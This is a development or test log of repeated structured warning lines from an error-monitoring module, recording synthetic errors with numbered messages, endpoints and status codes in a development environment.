WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949049Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4858'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949096Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4859'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4860'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949192Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4861'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949242Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4862'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4863'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949347Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4864'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949397Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4865'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949446Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4866'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949496Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4867'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949545Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4868'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949594Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4869'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949681Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4870'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949763Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4871'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4872'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949885Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4873'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949936Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4874'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949986Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4875'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950036Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4876'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950085Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4877'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950135Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4878'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4879'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950298Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4880'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950368Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4881'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950424Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4882'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950475Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4883'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950530Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4884'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950579Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4885'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4886'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4887'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950723Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4888'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4889'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.950948Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4890'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951001Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4891'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951050Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4892'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951100Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4893'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951149Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4894'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951198Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4895'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951247Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4896'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4897'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
